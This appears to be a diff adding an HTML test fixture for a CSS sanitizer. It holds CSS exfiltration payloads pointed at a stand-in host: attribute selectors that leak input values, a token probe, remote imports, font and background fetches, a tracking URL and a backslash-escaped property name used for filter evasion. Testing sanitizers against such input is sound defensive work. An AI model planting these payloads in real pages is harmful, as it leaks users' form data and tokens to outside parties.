@@ -1,0 +1,15 @@
+<html><head>
+<style>
+  @import 'https://evil.example.net/a.css';
+  input[value^="a"] { background: url(https://evil.example.net/leak?a); }
+  input[value^="b"] { background: url(https://evil.example.net/leak?b); }
+  @font-face { font-family: x; src: url(https://evil.example.net/font?unicode-range); }
+  a[href*="token"] { background-image: url("https://evil.example.net/leak?token"); }
+</style>
+<link rel="stylesheet" href="https://evil.example.net/remote.css">
+</head><body>
+<p style="background-image:url(https://evil.example.net/inline-bg.png);color:red">Inline background</p>
+<div style="font-family: x; background: URL( https://track.example.net/open?id=1 )">Tracker in CSS</div>
+<p style="color: red; background-color: #000">Colours only kept on request</p>
+<p style="b\61 ckground: url(https://evil.example.net/escaped)">CSS escape trick</p>
+</body></html>
